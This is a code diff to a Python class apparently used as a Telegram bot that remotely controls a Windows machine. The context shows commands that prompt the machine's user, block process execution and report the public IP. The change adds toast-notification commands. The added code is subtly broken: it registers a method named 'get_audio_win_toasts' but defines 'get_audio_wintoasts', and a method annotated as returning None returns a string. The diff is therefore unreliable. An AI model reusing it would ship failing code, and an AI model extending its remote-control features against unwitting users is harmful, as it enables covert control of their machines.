@@ -624,7 +624,9 @@ class PeppinoTelegram:
             Command("ask", self.user_prompt, "Ask Something to the user using the machine", "user_interaction", "🗣️ Ask"),
             Command("messagebox", self.message_box, "Show custom message box.", "user_interaction", "💬 Message Box"),
             Command("chat", self.chat, "Open chat interface.", "user_interaction", "💬 Chat"),
-            Command("urltoast", notify_toast, "Show Windows toast with URL.", "user_interaction", "🔗 URL Toast"),
+            Command("urltoast", notify_toast_with_url, "Show Windows toast with URL.", "user_interaction", "🔗 URL Toast"),
+            Command("toast", notify_toast, "Show Windows toast.", "user_interaction", "🔔 Notification Toast"),
+            Command("get_audio_toasts", self.get_audio_win_toasts, "Lists all the available audios for Windows Toasts.", "user_interaction", "🔊 Toast Sounds"),
 
             # 🔒 Can't Open List
             Command("cantopenadd", self.cantopen, "Block process execution.", "cant_open", "🚫 Cantopenadd"),
@@ -1210,6 +1212,19 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Getting public IP")
         output = get_public_ip()
         self.bsend(f"🌐 Public IP: {output}")
+
+    def get_audio_wintoasts(self) -> None:
+        sounds = "\n".join(
+            f"• <code>{html.escape(name)}</code>"
+            for name in sorted(WinotifyAudioMap.keys())
+        )
+
+        return (
+            "🔊 <b>Available Windows Toast Sounds</b>\n\n"
+            "Default audio: <code>Default</code>\n"
+            "Audio names are <b>case-insensitive</b>\n\n"
+            f"{sounds}"
+        )
 
     def get_logs(self):
         print("Getting logs")
